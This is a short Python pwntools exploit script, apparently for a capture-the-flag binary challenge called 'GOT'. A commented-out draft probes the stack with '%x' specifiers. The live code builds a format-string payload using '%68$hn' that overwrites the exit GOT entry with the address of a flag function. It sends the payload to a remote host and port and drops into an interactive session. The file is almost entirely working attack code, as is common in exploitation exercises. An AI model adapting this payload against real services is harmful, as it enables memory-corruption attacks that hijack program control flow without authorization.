# # coding=utf-8
# import struct

# flag_func = 0x4011b6
# exit_plt = 0x404038
# # 401223 40122d
# def pad(s):
#     return s+"X"*(512-len(s))
#     pass

# if __name__=='__main__':
#     # conn = pwn.process('./GOT')

#     # conn.interative()
#     exploit = ""
#     # exploit += str(struct.pack("I",exit_plt))
#     # exploit += (struct.pack("I",exit_plt))
#     # exploit += "\x38\x40\x40"+"\u0400"
#     # exploit += "ݔ
#     exploit = "Ӏ"
#     # exploit += "\u0806"
#     # exploit += "Ѐ"
#     # +"\U0041" + "\U0041" +"\U0041" +"\U0041"
#     exploit += "AAAAAAAA "
#     exploit += "%x "*10
#     # exploit += "%6$n"
#     # exploit += " %x "*10
#     # exploit += chr(0x38) + chr(0x40) + chr(0x40)
#     # print(exploit)
#     print(pad(exploit))
#     pass
import pwn
import struct
flag = 0x4011b6
exit = 0x404038

def pad(s):
    return s+"X"*(512 - len(s) - 16)


if __name__=='__main__':
    
    exploit = ""
    exploit += "AAAAAAAA"
    
    exploit += "%{}x".format(0x11b6-len(exploit))
    exploit += "%68$hn"
    # exploit += " %68$x "


    exploit = pad(exploit)

    # exploit += struct.pack('Q', exit)
    exploit += (struct.pack('Q', exit)).decode()
    # exploit += struct.pack('Q', exit+2)

    # print(exploit)
    conn = pwn.remote('140.113.207.240', 8835)
    conn.recvuntil("Give me some goodies:")
    print(454545)
    conn.send(exploit+'\n')
    print(676767)
    conn.interactive()
